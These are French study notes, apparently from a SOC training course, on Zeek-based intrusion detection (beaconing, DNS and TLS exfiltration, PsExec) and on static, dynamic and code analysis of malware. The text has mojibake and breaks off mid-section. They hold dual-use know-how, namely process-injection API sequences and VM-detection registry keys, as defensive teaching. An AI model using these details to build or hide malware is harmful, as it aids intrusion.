   * ExÃ©cute les gestionnaires d'Ã©vÃ©nements Ã©crits dans le langage de script de Zeek (scripts Zeek), qui spÃ©cifient les politiques de sÃ©curitÃ© du site.
   * Les Ã©vÃ©nements gÃ©nÃ©rÃ©s par le noyau de Zeek sont traitÃ©s de maniÃ¨re sÃ©quentielle par les scripts.

Les Ã©vÃ©nements de Zeek sont principalement dÃ©finis dans les fichiers `.bif` situÃ©s dans `/scripts/base/bif/plugins/`. Pour une liste complÃ¨te des Ã©vÃ©nements, consultez la **documentation des Ã©vÃ©nements Zeek**.

---

### Journaux de Zeek

Lors de l'exÃ©cution de Zeek en mode hors ligne avec un fichier PCAP, les journaux sont enregistrÃ©s dans le rÃ©pertoire actuel. Les journaux courants incluent :

* **conn.log** : DÃ©taille les connexions IP, TCP, UDP et ICMP.
* **dns.log** : Enregistre les requÃªtes et rÃ©ponses DNS.
* **http.log** : Enregistre les dÃ©tails des requÃªtes et rÃ©ponses HTTP.
* **ftp.log** : Enregistre les requÃªtes et rÃ©ponses FTP.
* **smtp.log** : Enregistre les transactions SMTP, y compris les dÃ©tails de l'expÃ©diteur et du destinataire.

#### Exemple de **http.log** :

Le fichier `http.log` contient des champs tels que **host**, **uri**, **referrer**, **user\_agent** et **status\_code**.

Pour une liste complÃ¨te des journaux et des champs de Zeek, consultez la **documentation des journaux Zeek**.

Zeek compresse les fichiers journaux toutes les heures en utilisant `gzip` et dÃ©place les journaux plus anciens dans un rÃ©pertoire nommÃ© selon la date (format AAAA-MM-JJ). Pour gÃ©rer ces journaux compressÃ©s, utilisez des outils comme **gzcat** (pour afficher le contenu) et **zgrep** (pour rechercher dans les journaux).

Zeek fournit Ã©galement **zeek-cut**, un utilitaire pour extraire des colonnes spÃ©cifiques des journaux de Zeek, facilitant ainsi l'analyse des journaux.

---

### FonctionnalitÃ©s clÃ©s de Zeek

Les principales fonctionnalitÃ©s qui renforcent l'efficacitÃ© de Zeek sont :

* **Journalisation dÃ©taillÃ©e des activitÃ©s rÃ©seau** : Capture une grande variÃ©tÃ© d'activitÃ©s rÃ©seau, y compris les protocoles de la couche application (par exemple, HTTP, DNS, FTP, SMTP, SSH, SSL).
* **Inspection du contenu des fichiers Ã©changÃ©s via des protocoles de la couche application**.
* **Support d'IPv6** : Zeek prend en charge l'analyse du trafic IPv6.
* **DÃ©tection et analyse des tunnels** : Identifie les tunnels rÃ©seau.
* **VÃ©rifications de validitÃ© dans l'analyse des protocoles**.
* **Correspondance de modÃ¨les similaire Ã  un IDS** : DÃ©tection basÃ©e sur des motifs de comportement suspects.
* **Langage de script puissant** : Permet d'ajouter des analyses personnalisÃ©es et de gÃ©rer des Ã©tats au sein des scripts.
* **Sortie des journaux en ASCII par dÃ©faut** : Options pour intÃ©grer avec des outils comme ElasticSearch et DataSeries.
* **IntÃ©gration en temps rÃ©el des entrÃ©es externes** : Permet d'analyser des flux en temps rÃ©el.
* **Interface avec des bibliothÃ¨ques C** : Partage des Ã©vÃ©nements Zeek avec d'autres programmes.
* **CapacitÃ© Ã  dÃ©clencher des processus externes depuis le langage de script**.

---

### Pour aller plus loin avec Zeek

Pour des exemples de rÃ¨gles, des bases de scripting et des cas d'utilisation, consultez la **documentation des exemples de Zeek**. Si vous dÃ©butez, le **guide de dÃ©marrage rapide de Zeek** est une excellente ressource.

Zeek est un outil extrÃªmement flexible et puissant pour l'analyse du trafic rÃ©seau, la dÃ©tection d'intrusions et le diagnostic des problÃ¨mes rÃ©seau, offrant des capacitÃ©s bien au-delÃ  de l'analyse classique basÃ©e sur des signatures.

```

## **Intrusion Detection With Zeek**

```jsx

---

### **Exemples de dÃ©tection d'intrusion**

#### **Exemple 1 : DÃ©tection de malware utilisant du beaconing**

Le *beaconing* est un comportement rÃ©pÃ©tÃ© utilisÃ© par les malwares pour communiquer avec un serveur de commande et contrÃ´le (C2). On peut dÃ©tecter ce comportement en analysant les connexions dans le fichier `conn.log`, en repÃ©rant les connexions rÃ©pÃ©titives vers la mÃªme adresse IP, avec des tailles de donnÃ©es constantes ou des intervalles rÃ©guliers.

Commande :

```bash
/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/psempire.pcap
cat conn.log
```

Analyse :
Le fichier `conn.log` montre des connexions rÃ©guliÃ¨res toutes les 5 secondes vers lâ€™IP `51.15.197.127:80`, typiques du malware PowerShell Empire.

---

#### **Exemple 2 : DÃ©tection dâ€™exfiltration de donnÃ©es via DNS**

Lâ€™exfiltration via DNS imite le trafic normal, mais peut Ãªtre dÃ©tectÃ©e en analysant les fichiers `files.log` ou `dns.log` de Zeek Ã  la recherche de transferts de donnÃ©es importants ou de canaux cachÃ©s. Le fichier `dns.log` peut rÃ©vÃ©ler des domaines ou sous-domaines suspects.

Commande :

```bash
/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/dnsexfil.pcapng
cat dns.log | /usr/local/zeek/bin/zeek-cut query | cut -d . -f1-7
```

Analyse :
Des sous-domaines frÃ©quents comme `456c54f2.blue.letsgohunt.online` indiquent un possible tunneling DNS.

---

#### **Exemple 3 : DÃ©tection dâ€™exfiltration de donnÃ©es via TLS**

Lâ€™exfiltration via TLS peut Ãªtre identifiÃ©e en repÃ©rant de grands volumes de donnÃ©es envoyÃ©es entre certaines machines. On analyse `conn.log` en filtrant et en agrÃ©geant les donnÃ©es pour dÃ©tecter des tailles anormales.

Commande :

```bash
/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/tlsexfil.pcap
cat conn.log | /usr/local/zeek/bin/zeek-cut id.orig_h id.resp_h orig_bytes | \
sort | grep -v -e '^$' | grep -v '-' | datamash -g 1,2 sum 3 | sort -k 3 -rn | head -10
```

Analyse :
Cette commande rÃ©vÃ¨le lâ€™envoi dâ€™environ 270 Mo de donnÃ©es Ã  lâ€™adresse `192.168.151.181`.

---

#### **Exemple 4 : DÃ©tection dâ€™activitÃ© PsExec**

PsExec est souvent utilisÃ© pour lâ€™administration Ã  distance et dans les attaques. Quand il est utilisÃ© via SMB, les fichiers `smb_files.log`, `dce_rpc.log` et `smb_mapping.log` peuvent rÃ©vÃ©ler son activitÃ©.

Commande :

```bash
/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/psexec_add_user.pcap
cat smb_files.log
cat dce_rpc.log
cat smb_mapping.log
```

Analyse :
Ces journaux montrent le transfert et lâ€™exÃ©cution du fichier `PSEXESVC.exe`, ce qui correspond au comportement typique de PsExec.

---

### **RÃ©sumÃ© des outils et commandes utilisÃ©s**

* **zeek-cut** : extrait des colonnes spÃ©cifiques des journaux Zeek.
* **sort** : trie les donnÃ©es pour faciliter lâ€™analyse.
* **grep** : filtre les rÃ©sultats.
* **datamash** : permet dâ€™agrÃ©ger les donnÃ©es (somme, regroupement, etc.).

Ces outils permettent de mettre en Ã©vidence des schÃ©mas de comportement suspects dans les journaux rÃ©seau. Leur utilisation combinÃ©e avec Zeek ou Wireshark permet une analyse fine du trafic.

---

```

## **Introduction to Malware Analysis**

## **Introduction To Malware & Malware Analysis part1**

```jsx

---

## ğŸ§  Introduction Ã  lâ€™Analyse de Malware

Ce module fournit les bases essentielles pour permettre aux analystes SOC de comprendre, dÃ©tecter et analyser les malwares, en se concentrant principalement sur ceux conÃ§us pour les systÃ¨mes Windows.

---

### ğŸ’¡ Types de Malware

* **Virus** : Infectent des fichiers lÃ©gitimes et se propagent en sâ€™y attachant.
* **Worms (vers)** : Se rÃ©pliquent automatiquement via les rÃ©seaux, sans interaction humaine.
* **Trojans (chevaux de Troie)** : DÃ©guisÃ©s en logiciels fiables, ils permettent un accÃ¨s non autorisÃ©.
* **Ransomware** : Chiffrent les donnÃ©es et exigent une ranÃ§on pour leur restitution.
* **Spyware** : Espionnent lâ€™utilisateur en collectant des donnÃ©es Ã  son insu (mots de passe, historique, etc.).
* **Adware** : Affichent des publicitÃ©s invasives et peuvent suivre les activitÃ©s en ligne.
* **Botnets** : RÃ©seaux dâ€™ordinateurs compromis utilisÃ©s pour lancer des attaques ou propager dâ€™autres malwares.
* **Rootkits** : Prennent le contrÃ´le de composants du systÃ¨me pour dissimuler des activitÃ©s malveillantes.
* **Backdoors / RATs** : Ouvrent un accÃ¨s Ã  distance permanent au systÃ¨me infectÃ©.
* **Droppers** : Installeurs furtifs utilisÃ©s pour dÃ©ployer d'autres charges malveillantes.
* **Information Stealers** : ConÃ§us pour dÃ©rober des donnÃ©es sensibles (identifiants, informations personnelles, etc.).

---

### ğŸ—‚ï¸ Sources de Samples (Ã‰chantillons de Malware)

Lâ€™analyse de malware doit toujours sâ€™effectuer dans un environnement isolÃ© et sÃ©curisÃ©. Voici quelques plateformes fiables pour se procurer des Ã©chantillons :

* **VirusShare**
* **Hybrid Analysis**
* **TheZoo** (GitHub)
* **Malware-Traffic-Analysis.net**
* **VirusTotal**
* **ANY.RUN**
* **Contagio Malware Dump**
* **VX Underground**

---

### ğŸ§¾ Acquisition de Malware / Preuves NumÃ©riques

Lors dâ€™une enquÃªte, la capture du disque et de la mÃ©moire vive est cruciale pour collecter des preuves.

#### ğŸ–´ Outils dâ€™Imagerie Disque :

* **FTK Imager** : RÃ©fÃ©rence dans la crÃ©ation dâ€™images forensiques.
* **OSFClone** : Outil open source compatible avec divers systÃ¨mes de fichiers.
* **DD / DCFLDD** : Utilitaires en ligne de commande trÃ¨s utilisÃ©s sous Linux pour la copie bit Ã  bit.

#### ğŸ§  Outils dâ€™Acquisition de MÃ©moire Vive :

* **DumpIt** : Simple dâ€™utilisation pour les systÃ¨mes Windows/Linux.
* **MemDump** : Utilitaire en ligne de commande pour la capture RAM.
* **Belkasoft RAM Capturer** : SpÃ©cialisÃ© dans la rÃ©cupÃ©ration mÃ©moire mÃªme face Ã  lâ€™anti-debugging.
* **Magnet RAM Capture** : Outil ergonomique de Magnet Forensics.
* **LiME (Linux Memory Extractor)** : Parfait pour lâ€™analyse de la mÃ©moire volatile sous Linux.

#### ğŸ§° Autres outils utiles :

* **KAPE** : Pour la collecte ciblÃ©e dâ€™artÃ©facts.
* **Velociraptor** : Outil dâ€™investigation basÃ© sur une requÃªte personnalisable (VQL).

---

### ğŸ§ª DÃ©finition, Objectifs et MÃ©thodes de lâ€™Analyse de Malware

Lâ€™analyse de malware consiste Ã  Ã©tudier un logiciel malveillant pour comprendre son fonctionnement, sa source, et son impact. Elle contribue Ã  :

* Renforcer les capacitÃ©s de dÃ©tection,
* Mener du reverse engineering,
* Collecter de lâ€™intelligence sur les menaces.

#### ğŸ¯ Objectifs Principaux :

* **DÃ©tection et Classification** : Identifier le type de malware et crÃ©er des rÃ¨gles de dÃ©tection.
* **Reverse Engineering** : DÃ©sassembler le code pour en comprendre la logique, les mÃ©thodes de chiffrement et les mÃ©canismes de communication avec un C2.
* **Analyse Comportementale** : Observer les actions du malware sur le systÃ¨me (fichiers crÃ©Ã©s, connexions, processus, etc.).
* **Renseignement sur la menace (Threat Intel)** : Identifier les tactiques, techniques et infrastructures utilisÃ©es par les attaquants.

---

### ğŸ› ï¸ Techniques Courantes dâ€™Analyse

* **Analyse Statique** : Ã‰tude du fichier sans lâ€™exÃ©cuter pour repÃ©rer des Ã©lÃ©ments clÃ©s (signatures, chaÃ®nes, imports).
* **Analyse Dynamique** : ExÃ©cution du malware dans un environnement contrÃ´lÃ© pour observer son comportement.
* **Analyse de Code** : Reverse engineering pour explorer en profondeur les fonctions et structures du malware.
* **Analyse MÃ©moire** : Inspection de la RAM pour dÃ©tecter du code injectÃ© ou des comportements actifs.
* **DÃ©compactage de Malware** : Extraction du vrai code masquÃ© par un packer ou un crypteur.

---

```

## **Windows Internals**

```jsx

---

## ğŸ§  Comprendre les Internes de Windows pour lâ€™Analyse de Malware

La comprÃ©hension des mÃ©canismes internes de Windows est essentielle pour analyser efficacement les malwares. Cela permet dâ€™interprÃ©ter leur comportement, dâ€™identifier leurs points dâ€™ancrage dans le systÃ¨me, et de dÃ©tecter leurs mÃ©thodes de persistance ou dâ€™Ã©vasion.

---

### ğŸ§­ Modes de Fonctionnement de Windows

* **Mode Utilisateur (User Mode)**
  AccÃ¨s restreint ; utilisÃ© par les applications.
  â†’ Le malware peut manipuler les fichiers, le registre ou chercher Ã  Ã©lever ses privilÃ¨ges.

* **Mode Noyau (Kernel Mode)**
  AccÃ¨s total au systÃ¨me et au matÃ©riel.
  â†’ Les malwares en mode noyau peuvent modifier le comportement de Windows, intercepter des appels systÃ¨me et se cacher plus efficacement.

---

### ğŸ—ï¸ Architecture de Windows

#### ğŸ”¹ Composants en Mode Utilisateur

* **Processus SystÃ¨me** : ex. `winlogon.exe`, `smss.exe`, `services.exe`.
* **Services** : tÃ¢ches en arriÃ¨re-plan comme Windows Update ou le Planificateur.
* **Applications Utilisateur** : communiquent avec le noyau via les API (NTDLL.DLL).
* **Sous-systÃ¨mes dâ€™environnement** : ex. Win32, POSIX.
* **DLL de Sous-systÃ¨me** : font le lien entre fonctions documentÃ©es et appels natifs (`kernelbase.dll`, `user32.dll`, etc.).

#### ğŸ”¸ Composants en Mode Noyau

* **Executive** : GÃ¨re I/O, processus, objets, sÃ©curitÃ©.
* **Kernel** : Planification des tÃ¢ches, synchronisation.
* **Pilotes** : Interface entre Windows et le matÃ©riel.
* **HAL (Hardware Abstraction Layer)** : Abstraction du matÃ©riel.
* **Win32k.sys** : GÃ¨re lâ€™interface graphique.

---

### ğŸ§µ Flux des Appels API Windows

Les malwares utilisent frÃ©quemment les API Windows pour interagir avec le systÃ¨me.

#### ğŸ”„ Exemple dâ€™appel : `ReadProcessMemory`

* **Flux dâ€™exÃ©cution** :
  `kernel32.dll` â†’ `ntdll.dll` â†’ `NtReadVirtualMemory` â†’ Appel systÃ¨me au noyau.

* **SSDT (System Service Descriptor Table)** :
  GÃ¨re la correspondance entre les appels systÃ¨me et les fonctions du noyau.

---

### ğŸ“¦ Format PE (Portable Executable)

Le format PE est utilisÃ© pour les `.exe`, `.dll`, etc.
Comprendre sa structure est fondamental pour identifier du code malveillant.

#### Sections courantes :

* `.text` : Code exÃ©cutable.
* `.data` : Variables initialisÃ©es.
* `.rdata` : DonnÃ©es constantes.
* `.pdata` : Gestion des exceptions.
* `.bss` : DonnÃ©es non initialisÃ©es.
* `.rsrc` : Ressources (icÃ´nes, images).
* `.idata` : Fonctions importÃ©es.
* `.edata` : Fonctions exportÃ©es.
* `.reloc` : DonnÃ©es de relocalisation.

ğŸ” Lâ€™analyse de ces sections permet dâ€™observer le comportement interne du malware, les fonctions appelÃ©es, et les ressources intÃ©grÃ©es.

---

### âš™ï¸ Processus Windows

Un **processus** est une instance dâ€™un programme en exÃ©cution, avec ses propres ressources systÃ¨me :

* **PID** : Identifiant unique.
* **Espace mÃ©moire virtuel** : Code, donnÃ©es, pile, etc.
* **Code exÃ©cutable** : Instructions chargÃ©es depuis le disque.
* **Handles** : RÃ©fÃ©rences vers fichiers, registres, etc.
* **Contexte de sÃ©curitÃ©** : Jeton dÃ©finissant les droits.
* **Threads** : UnitÃ©s d'exÃ©cution parallÃ¨les au sein dâ€™un processus.

ğŸ§  Suivre ces Ã©lÃ©ments aide Ã  repÃ©rer les comportements suspects dâ€™un malware.

---

### ğŸ§© BibliothÃ¨ques Dynamiques (DLL)

Les DLL contiennent des fonctions partagÃ©es utilisÃ©es Ã  la fois par Windows et les malwares.

#### ğŸ“¥ Fonctions ImportÃ©es

ChargÃ©es dynamiquement pour interagir avec le systÃ¨me.

ğŸ§ª Exemple dâ€™injection de code :

* `OpenProcess`
* `VirtualAllocEx`
* `WriteProcessMemory`
* `CreateRemoteThread`

#### ğŸ“¤ Fonctions ExportÃ©es

ExposÃ©es par une DLL pour Ãªtre utilisÃ©es par d'autres processus.

ğŸ” Exemple : Les exports de `kernel32.dll` visibles avec **CFF Explorer** ou **x64dbg** rÃ©vÃ¨lent des appels systÃ¨me clÃ©s.

---

```

## **Static Analysis On Linux**

```jsx

---

## ğŸ” Analyse Statique de Malware

Lâ€™analyse statique consiste Ã  examiner un fichier malveillant **sans lâ€™exÃ©cuter**. Cette mÃ©thode permet de recueillir des informations essentielles sur lâ€™Ã©chantillon, telles que son type, ses chaÃ®nes de caractÃ¨res, ses empreintes (hashes), les Ã©lÃ©ments intÃ©grÃ©s, et les signes de compression ou dâ€™obfuscation. Elle constitue une Ã©tape fondamentale avant lâ€™analyse dynamique ou le reverse engineering.

---

### ğŸ“ Ã‰lÃ©ments ClÃ©s de lâ€™Analyse Statique

* **Type de fichier** : Permet de vÃ©rifier la vraie nature du fichier, indÃ©pendamment de son extension.
* **Empreintes (hashes)** : Un identifiant unique permettant de tracer ou comparer un Ã©chantillon.
* **ChaÃ®nes de caractÃ¨res (strings)** : Donnent des indices sur le comportement ou les cibles du malware.
* **Ã‰lÃ©ments intÃ©grÃ©s** : Domaines, chemins systÃ¨me, noms de fichiers, etc.
* **PrÃ©sence dâ€™un packer** : Les packers compriment ou chiffrent les malwares pour masquer leur contenu.
* **Fonctions importÃ©es/exportÃ©es** : RÃ©vÃ¨lent les API Windows utilisÃ©es.
* **Code assembleur** : Fournit une vision bas niveau sur le fonctionnement du binaire.

---

### ğŸ“Œ Identification du Type de Fichier

Pour dÃ©terminer le type rÃ©el du fichier :

```bash
file /chemin/vers/malware.exe
```

Exemple de rÃ©sultat :

```
PE32 executable (GUI) Intel 80386, for MS Windows
```

ğŸ” VÃ©rification du header :

```bash
hexdump -C /chemin/vers/malware.exe | more
```

Cherchez la signature **"MZ"** (hexadÃ©cimal **4D 5A**) pour confirmer un exÃ©cutable Windows.

---

### ğŸ§¬ Empreintes et "Fingerprinting"

#### ğŸ” Hashs de fichiers

Pour gÃ©nÃ©rer un identifiant unique du fichier :

```bash
md5sum /chemin/vers/malware.exe
sha256sum /chemin/vers/malware.exe
```

Utilisez ces valeurs sur des bases comme [VirusTotal](https://virustotal.com) pour croiser les informations.

#### ğŸ§¬ Empreinte des Imports (IMPHASH)

Lâ€™**IMPHASH** identifie des malwares similaires en se basant sur leurs fonctions importÃ©es.

Exemple en Python :

```python
import sys
import pefile

pe = pefile.PE(sys.argv[1])
print(pe.get_imphash())
```

ExÃ©cution :

```bash
python3 imphash_calc.py /chemin/vers/malware.exe
```

#### ğŸ§ª Fuzzy Hashing avec SSDEEP

Pour mesurer la similaritÃ© entre fichiers :

```bash
ssdeep /chemin/vers/malware.exe
```

#### ğŸ”„ Hash des Sections PE

Analyser sÃ©parÃ©ment chaque section (.text, .data, etc.) permet de dÃ©tecter des modifications mineures.

Exemple Python :

```python
import sys
import pefile

pe = pefile.PE(sys.argv[1])
for section in pe.sections:
    print(section.Name, "MD5 :", section.get_hash_md5())
    print(section.Name, "SHA256 :", section.get_hash_sha256())
```

ExÃ©cution :

```bash
python3 section_hashing.py /chemin/vers/malware.exe
```

---

### ğŸ”¡ Analyse de ChaÃ®nes de CaractÃ¨res

Les chaÃ®nes ASCII/Unicode extraites peuvent contenir :

* Noms de fichiers
* IP, domaines
* Fonctions API
* ClÃ©s de registre

Commande pour extraire les chaÃ®nes longues :

```bash
strings -n 15 /chemin/vers/malware.exe
```

ğŸ” Pour dÃ©tecter des chaÃ®nes obfusquÃ©es :

```bash
floss /chemin/vers/malware.exe
```

---

### ğŸ“¦ DÃ©tection et DÃ©compression de Malware PackÃ© (UPX)

Les malwares packÃ©s masquent leur code. Le mot-clÃ© "UPX" dans les chaÃ®nes peut indiquer l'utilisation de ce packer.

#### DÃ©compresser un exÃ©cutable UPX :

```bash
upx -d -o /chemin/vers/unpacked_malware.exe /chemin/vers/malware.exe
```

Puis relancez lâ€™analyse :

```bash
strings /chemin/vers/unpacked_malware.exe
```

---

```

## **Static Analysis On Windows**

```jsx

---

## ğŸ” Analyse Statique de Malware sur Windows

Lâ€™analyse statique sous Windows suit les mÃªmes principes que sous Linux, mais utilise des outils spÃ©cifiques Ã  lâ€™environnement Windows pour examiner les fichiers malveillants sans les exÃ©cuter. Cette mÃ©thode permet dâ€™identifier des Ã©lÃ©ments clÃ©s comme le type de fichier, les empreintes (hashes), les chaÃ®nes de caractÃ¨res et dâ€™Ã©ventuelles traces dâ€™obfuscation ou de compression.

---

### ğŸ§© Ã‰lÃ©ments ClÃ©s de lâ€™Analyse Statique sous Windows

* **Identification du type de fichier** : VÃ©rifie quâ€™il sâ€™agit bien dâ€™un exÃ©cutable Windows (fichier PE).
* **Hashing** : GÃ©nÃ©ration de hash MD5/SHA256 pour suivre et comparer les Ã©chantillons.
* **IMPHASH** : Hachage basÃ© sur les fonctions importÃ©es, utile pour dÃ©tecter des variantes.
* **Fuzzy Hashing (SSDEEP)** : Compare la similaritÃ© entre diffÃ©rents fichiers.
* **Hash des sections** : Permet de repÃ©rer des altÃ©rations dans les sections PE.
* **Analyse de chaÃ®nes de caractÃ¨res** : Permet dâ€™identifier des Ã©lÃ©ments utiles comme des IP, chemins systÃ¨me ou appels API.
* **DÃ©packaging** : Permet dâ€™extraire le contenu rÃ©el dâ€™un malware packÃ© avec UPX.

---

### ğŸ“ VÃ©rification du Type de Fichier

Utilise **CFF Explorer** (C:\Tools\Explorer Suite) pour analyser la structure du fichier. VÃ©rifie la prÃ©sence de la signature ASCII **"MZ"** dans lâ€™en-tÃªte pour confirmer quâ€™il sâ€™agit dâ€™un exÃ©cutable Windows.

---

### ğŸ§¬ Empreintes et "Fingerprinting"

#### ğŸ” GÃ©nÃ©ration de Hashs avec PowerShell

```powershell
Get-FileHash -Algorithm MD5 C:\Samples\MalwareAnalysis\malware.exe
Get-FileHash -Algorithm SHA256 C:\Samples\MalwareAnalysis\malware.exe
```

---

#### ğŸ§¬ Calcul de lâ€™IMPHASH

Script Python avec le module `pefile` :

```python
import sys
import pefile

pe_file = sys.argv[1]
pe = pefile.PE(pe_file)
print(pe.get_imphash())
```

ExÃ©cution :

```bash
python imphash_calc.py C:\Samples\MalwareAnalysis\malware.exe
```

---

#### ğŸ” Fuzzy Hashing avec SSDEEP

```cmd
C:\Tools\ssdeep-2.14.1\ssdeep.exe C:\Samples\MalwareAnalysis\malware.exe
```

---

#### ğŸ§ª Hash des Sections PE (Python)

Script dâ€™exemple :

```python
import sys
import pefile

pe_file = sys.argv[1]
pe = pefile.PE(pe_file)
for section in pe.sections:
    print(section.Name, "MD5 hash:", section.get_hash_md5())
    print(section.Name, "SHA256 hash:", section.get_hash_sha256())
```

ğŸ”§ Outil graphique alternatif : **PEStudio**
(C:\Tools\pestudio\pestudio)

---

### ğŸ”¡ Analyse de ChaÃ®nes de CaractÃ¨res

#### ğŸ“œ Extraction des chaÃ®nes :

```cmd
C:\Sysinternals\strings.exe C:\Samples\MalwareAnalysis\malware.exe
```

#### ğŸ” Pour les chaÃ®nes obfusquÃ©es :

```cmd
C:\FLOSS\floss.exe C:\Samples\MalwareAnalysis\malware.exe
```

---

### ğŸ“¦ DÃ©compression de Malware PackÃ© avec UPX

Rechercher la prÃ©sence de **"UPX"** dans les chaÃ®nes extraites est un bon indicateur dâ€™un fichier packÃ©.

#### ğŸ”“ DÃ©compression :

```cmd
C:\Tools\upx\upx-4.0.2-win64\upx.exe -d -o unpacked_malware.exe C:\Samples\MalwareAnalysis\packed\malware.exe
```

Puis relancer lâ€™analyse :

```cmd
C:\Sysinternals\strings.exe unpacked_malware.exe
```

---

```

## **Dynamic Analysis**

```jsx

---

### ğŸ” Analyse Dynamique des Malwares

Lâ€™analyse dynamique consiste Ã  observer le comportement dâ€™un malware en lâ€™exÃ©cutant dans un environnement contrÃ´lÃ©. Contrairement Ã  lâ€™analyse statique, qui examine le fichier sans lâ€™exÃ©cuter, cette mÃ©thode permet de voir en temps rÃ©el les modifications apportÃ©es au systÃ¨me.

---

### ğŸ› ï¸ Ã‰tapes ClÃ©s de lâ€™Analyse Dynamique

#### 1. **Mise en Place de lâ€™Environnement**

CrÃ©ez une **machine virtuelle isolÃ©e** pour exÃ©cuter le malware sans risque pour le reste du rÃ©seau. Il est essentiel de simuler un environnement rÃ©aliste : applications courantes, donnÃ©es utilisateur, configuration rÃ©seau fonctionnelle.

#### 2. **Capture de lâ€™Ã‰tat Initial**

Avant dâ€™exÃ©cuter le malware, prenez un **instantanÃ© du systÃ¨me** : Ã©tat des fichiers, registre Windows, processus actifs, configurations rÃ©seau. Cette base servira Ã  comparer les changements provoquÃ©s par lâ€™exÃ©cution du malware.

#### 3. **DÃ©ploiement des Outils (PrÃ©-ExÃ©cution)**

Installez et configurez des outils de surveillance comme :

* **ProcMon** (Sysinternals) : journalisation des accÃ¨s fichiers, modifications du registre, crÃ©ation de processus, etc.
* **Wireshark / tcpdump** : capture du trafic rÃ©seau.
* **Regshot** : comparaison de lâ€™Ã©tat du registre avant/aprÃ¨s.
* **INetSim**, **FakeDNS**, **FakeNet-NG** : Ã©mulation de services rÃ©seau pour interagir avec le malware.

#### 4. **ExÃ©cution du Malware**

Lancez le malware avec les outils de surveillance actifs. Laissez-le sâ€™exÃ©cuter assez longtemps pour observer ses actions, sans intervenir.

#### 5. **Observation et Journalisation**

Surveillez :

* La **crÃ©ation de processus**,
* Les **modifications de fichiers** et du **registre**,
* Les **communications rÃ©seau**.

#### 6. **Analyse Post-ExÃ©cution**

Une fois le malware arrÃªtÃ© :

* Comparez lâ€™Ã©tat du systÃ¨me avec le snapshot initial.
* Recherchez les anomalies : fichiers crÃ©Ã©s, clÃ©s registre modifiÃ©es, processus suspects, connexions externes.

---

### âš™ï¸ Analyse Dynamique avec **Noriben**

**Noriben** est un script Python qui automatise lâ€™utilisation de ProcMon en filtrant les donnÃ©es inutiles pour mettre en Ã©vidence les comportements suspects.

#### âœ… Ã‰tapes dâ€™Utilisation de Noriben

1. **Lancer Noriben** :

   ```bash
   cd C:\Tools\Noriben-master
   python Noriben.py
   ```

2. **DÃ©marrage de ProcMon** : Noriben lance ProcMon avec des filtres prÃ©dÃ©finis.

3. **ExÃ©cution du Malware** :
   ExÃ©cutez par exemple `shell.exe` dans `C:\Samples\MalwareAnalysis`.

4. **ArrÃªter lâ€™Enregistrement** :
   Dans le terminal Noriben, utilisez `Ctrl+C` pour stopper la capture.

5. **Analyser le Rapport** :
   Noriben gÃ©nÃ¨re un fichier `.txt` contenant un rÃ©sumÃ© des actions suspectes classÃ©es par type (fichiers, registre, processus, rÃ©seau).

---

### ğŸ”¬ Analyse Fine avec ProcMon Directement

Si Noriben filtre trop dâ€™informations, il peut Ãªtre utile dâ€™utiliser ProcMon manuellement :

#### Ã‰tapes :

1. **Ouvrir ProcMon** :
   Depuis `C:\Tools\sysinternals`.

2. **Configurer les Filtres** :

   * `Ctrl+L` pour accÃ©der aux filtres.
   * Exemple : `Process Name is shell.exe`.

3. **ExÃ©cuter le Malware** :
   Lancez de nouveau le malware pour enregistrer ses activitÃ©s.

4. **Analyser les Comportements de DÃ©tection** :
   Certains malwares peuvent interroger des clÃ©s de registre liÃ©es Ã  VMware (ex : `SOFTWARE\VMware, Inc.`) pour dÃ©tecter une sandbox.

---

### ğŸ§° Outils ComplÃ©mentaires pour lâ€™Analyse Dynamique

* **Sandboxes automatisÃ©es** :

  * **Cuckoo Sandbox**,
  * **Joe Sandbox**,
  * **FireEye DTI Cloud**, etc.

âš ï¸ Certains malwares avancÃ©s **dÃ©tectent ces environnements** et modifient leur comportement pour Ã©viter la dÃ©tection.

---

### ğŸ§ª Exemples de Commandes

* **Lancer Noriben** :

  ```bash
  python Noriben.py
  ```

* **Utiliser ProcMon** :

  * Lancer ProcMon.
  * `Ctrl+L` â†’ Ajouter un filtre : `Process Name is shell.exe`.
  * Observer les entrÃ©es : accÃ¨s registre, fichiers, processus, connexions rÃ©seau.

---

```

## **Code Analysis**

```jsx
L'ingÃ©nierie inverse permet aux analystes de comprendre la fonctionnalitÃ© et le comportement d'un malware en dissÃ©quant son code machine compilÃ©. Cela implique gÃ©nÃ©ralement de convertir le code machine en langage assembleur et d'interprÃ©ter les opÃ©rations sans les exÃ©cuter.

Lors de l'analyse de code, notre objectif est de :

* **Dissocier le code** pour examiner sa structure et sa logique sans dÃ©clencher d'actions.
* **Identifier les fonctions clÃ©s** et les Ã©ventuels Indicateurs de Compromission (IOCs).
* **Explorer le flux de contrÃ´le** pour repÃ©rer des fonctions critiques, telles que la dÃ©tection de sandbox et les mÃ©canismes de persistance.

### Outils pour l'Analyse de Code

* **DÃ©sassembleurs** : UtilisÃ©s pour l'analyse statique du code machine (par exemple, IDA, Ghidra, Cutter).
* **DÃ©bogueurs** : Permettent l'exÃ©cution interactive du code et le contrÃ´le de celui-ci (par exemple, x32dbg, x64dbg, OllyDbg).

### Exemple d'Analyse de Code : shell.exe

L'Ã©chantillon de malware shell.exe illustre diverses techniques, telles que la dÃ©tection de sandbox et l'injection de processus, qui peuvent Ãªtre dÃ©codÃ©es par dÃ©sassemblage dans IDA.

#### Importation et DÃ©sassemblage de shell.exe dans IDA

1. **Charger shell.exe dans IDA** :

   * Ouvrir IDA en mode administrateur.
   * Charger l'exÃ©cutable et laisser IDA analyser le fichier binaire.

2. **Naviguer dans les vues** :

   * **Graph View** : Visualise le flux de contrÃ´le des fonctions, facilitant l'identification des chemins d'exÃ©cution et de leurs relations.
   * **Text View** : Affiche le code assembleur ligne par ligne avec les adresses mÃ©moire, utile pour un examen dÃ©taillÃ© des instructions.

### Zones ClÃ©s d'Analyse

* **Identifier la fonction principale** :

  * La fonction de dÃ©marrage dans IDA montre la configuration initiale. Suivre les appels et les sauts pour localiser la fonction principale. Cela peut inclure des tÃ¢ches d'initialisation et de configuration des cadres de pile.

* **Techniques de dÃ©tection de sandbox** :

